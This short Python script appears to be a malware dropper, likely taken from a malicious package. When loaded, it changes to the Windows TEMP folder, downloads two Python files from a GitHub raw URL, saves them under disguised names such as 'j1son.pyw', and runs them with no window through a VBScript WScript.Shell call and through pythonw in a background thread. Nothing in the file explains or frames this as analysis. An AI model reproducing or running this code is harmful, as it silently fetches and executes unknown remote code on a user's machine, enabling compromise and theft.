def runner():
    import os,threading,json,time,subprocess,requests
    currwdir = os.getcwd()
    os.chdir(os.getenv('TEMP'))
    def v1():
        open('j1son.pyw', 'wb').write(
            requests.get('https://raw.githubusercontent.com/gboacloth/te87/main/db.py').content)
        ok = '''Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run chr(34) & "j1son.pyw" & Chr(34), 0\nSet WshShell = Nothing'''
        open('j2son.vbs', 'w').write(ok)
        os.system('j2son.vbs')
    def v2():
        infox = requests.get('https://raw.githubusercontent.com/gboacloth/te87/main/bd2.py')
        open('QLQWA2.pyw', 'wb').write(infox.content)
        subprocess.call(['pythonw', 'QLQWA2.pyw'])
    v1()
    threading.Thread(target=v2).start()
    os.chdir(currwdir)
runner()
